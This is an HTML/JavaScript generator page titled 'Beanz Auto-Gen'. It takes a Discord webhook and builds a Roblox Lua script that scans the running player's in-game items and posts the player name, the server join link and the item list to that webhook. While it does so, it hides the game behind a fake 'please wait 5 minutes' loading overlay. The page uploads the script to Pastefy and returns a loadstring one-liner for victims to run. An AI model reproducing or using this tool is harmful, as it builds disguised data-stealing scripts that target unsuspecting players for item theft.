<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Beanz Auto-Uploader</title>
    <style>
        body { background: #0a0a0a; color: #00ff64; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #111; border: 1px solid #00ff64; padding: 25px; border-radius: 8px; box-shadow: 0 0 15px rgba(0, 255, 100, 0.3); width: 450px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #333; color: #00ff64; border-radius: 4px; box-sizing: border-box; outline: none; }
        button { width: 100%; padding: 12px; background: #00ff64; border: none; color: #000; font-weight: bold; cursor: pointer; border-radius: 4px; }
        button:hover { background: #00cc52; }
        .status { margin-top: 20px; font-size: 14px; color: #fff; }
        #resultLink { margin-top: 10px; color: #00ff64; word-break: break-all; cursor: pointer; display: none; background: #000; padding: 10px; border: 1px dashed #00ff64; font-size: 12px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>BEANZ AUTO-GEN</h2>
        <input type="text" id="webhook" placeholder="Paste Discord Webhook URL">
        <button id="genBtn" onclick="generateAndUpload()">GENERATE & UPLOAD</button>
        <div class="status" id="status">Ready...</div>
        <div id="resultLink" onclick="copyResult()"></div>
    </div>

    <script>
        async function generateAndUpload() {
            const url = document.getElementById('webhook').value.trim();
            const status = document.getElementById('status');
            const resultLink = document.getElementById('resultLink');
            const btn = document.getElementById('genBtn');

            if (!url.includes("discord.com/api/webhooks")) {
                alert("Please enter a valid Webhook URL!");
                return;
            }

            btn.disabled = true;
            status.innerText = "Uploading to Pastefy...";

            const rawScript = `local WEBHOOK_URL = "${url}"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

local function scan()
    local d = {}
    local deb = Workspace:FindFirstChild("Debris")
    if not deb then return d end
    for _, t in ipairs(deb:GetChildren()) do
        if t.Name == "FastOverheadTemplate" then
            local ov = t:FindFirstChild("AnimalOverhead")
            if ov then
                local n = ov:FindFirstChild("DisplayName")
                local g = ov:FindFirstChild("Generation")
                if n and g then table.insert(d, n.Text .. " (Gen: " .. g.Text .. ")") end
            end
        end
    end
    return d
end

local function send(link)
    local items = scan()
    local s = table.concat(items, "\\n")
    local p = {
        ["content"] = "@everyone",
        ["embeds"] = {{
            ["title"] = "🫘 Beanz Log Scrape",
            ["color"] = 65280,
            ["fields"] = {
                {["name"] = "👤 Player", ["value"] = "\\\`\\\`\\\`" .. LocalPlayer.Name .. "\\\`\\\`\\\`"},
                {["name"] = "🔗 Server Link", ["value"] = link},
                {["name"] = "📂 Brainrots Found", ["value"] = "\\\`\\\`\\\`" .. (s ~= "" and s or "No Items Found") .. "\\\`\\\`\\\`"}
            }
        }}
    }
    local r = syn and syn.request or http and http.request or http_request or request
    if r then r({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(p)}) end
end

local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
local f = Instance.new("Frame", sg)
f.Size = UDim2.new(1, 0, 1, 100)
f.Position = UDim2.new(0,0,0,-50)
f.BackgroundColor3 = Color3.new(0,0,0)
local l = Instance.new("TextLabel", f)
l.Size = UDim2.new(1,0,1,0)
l.Text = "LOADING... PLEASE WAIT 5 MINUTES"
l.TextColor3 = Color3.new(1,1,1)
l.Font = Enum.Font.GothamBold
l.TextSize = 35

task.wait(3)
send("https://www.roblox.com/games/" .. game.PlaceId .. "?server=" .. game.JobId)
`;

            try {
                // Fixed using CORS Proxy to allow GitHub -> Pastefy communication
                const response = await fetch('https://corsproxy.io/?' + encodeURIComponent('https://api.pastefy.app/v2/paste'), {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        title: "Beanz Script",
                        content: rawScript,
                        type: "LUA"
                    })
                });

                const data = await response.json();

                if (data.success) {
                    const finalScript = `loadstring(game:HttpGet("https://pastefy.app/${data.paste.id}/raw"))()`;
                    status.innerText = "SUCCESS! Click below to copy:";
                    resultLink.innerText = finalScript;
                    resultLink.style.display = "block";
                } else {
                    status.innerText = "Pastefy Error. Try again.";
                }
            } catch (err) {
                status.innerText = "Connection Error. Try again.";
                console.error(err);
            }
            btn.disabled = false;
        }

        function copyResult() {
            const text = document.getElementById('resultLink').innerText;
            navigator.clipboard.writeText(text);
            alert("Copied to clipboard!");
        }
    </script>
</body>
</html>
